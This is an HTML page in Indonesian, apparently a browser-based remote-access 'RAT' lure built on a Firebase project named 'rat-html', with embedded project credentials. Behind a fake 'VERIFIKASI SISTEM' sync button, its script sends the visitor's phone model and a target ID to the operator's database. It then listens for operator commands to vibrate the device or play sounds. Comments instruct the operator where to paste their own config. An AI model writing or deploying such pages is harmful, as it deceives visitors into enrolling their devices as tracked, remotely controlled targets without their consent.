<!DOCTYPE html>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #333; padding: 25px; border-radius: 15px; width: 80%; max-width: 300px; text-align: center; }
        button { background: #ffd700; color: #000; border: none; padding: 12px; font-weight: bold; border-radius: 8px; width: 100%; margin-top: 15px; cursor: pointer; }
        p { font-size: 11px; color: #888; }
    </style>
</head>
<body>

    <div class="box" id="land">
        <b>VERIFIKASI SISTEM</b>
        <p>Klik tombol di bawah untuk sinkronisasi perangkat.</p>
        <button onclick="gas()">VERIFIKASI</button>
    </div>

<script>
    // ============================================================
    // ⬇️ PASANG FIREBASE CONFIG LO DI BAWAH INI ⬇️
    // ============================================================
    
    const firebaseConfig = {
  apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
  authDomain: "rat-html.firebaseapp.com",
  databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "rat-html",
  storageBucket: "rat-html.firebasestorage.app",
  messagingSenderId: "1060124583265",
  appId: "1:1060124583265:web:7988dc574a1be9f10f5120",
  measurementId: "G-SP76CHQ5XN"
};

    // ============================================================
    // ⬆️ JANGAN ADA YANG DIUBAH LAGI DI BAWAH INI ⬆️
    // ============================================================

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const params = new URLSearchParams(window.location.search);
    const myKey = params.get('key') || "UNKNOWN";
    const tid = "TGT-" + Math.floor(Math.random() * 9999);

    function gas() {
        // Ambil izin hardware via klik (WAJIB)
        if(navigator.vibrate) navigator.vibrate(100);
        new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play().catch(()=>{});

        document.getElementById('land').innerHTML = "<b>✓ Berhasil</b><br><p>Perangkat telah tersinkron.</p>";
        
        // Kirim data HP ke database lo
        db.ref('mario/targets/' + tid).set({
            model: getHP(),
            belongsTo: myKey,
            status: "online"
        });

        // Standby nunggu perintah dari Dashboard lo
        db.ref('mario/commands/' + tid).on('value', (s) => {
            const c = s.val(); 
            if(!c) return;
            if(c.action === "vibrate") navigator.vibrate([500, 200, 500]);
            if(c.action === "play_audio") new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play();
            // Perintah senter (tergantung browser)
        });
    }

    function getHP() {
        const ua = navigator.userAgent;
        if(/android/i.test(ua)) {
            const m = ua.match(/Android\s+([^\s;]+|[^;]+);\s+([^;)]+)/);
            return m ? m[2] : "Android Device";
        }
        return "Browser User";
    }
</script>
</body>
</html>
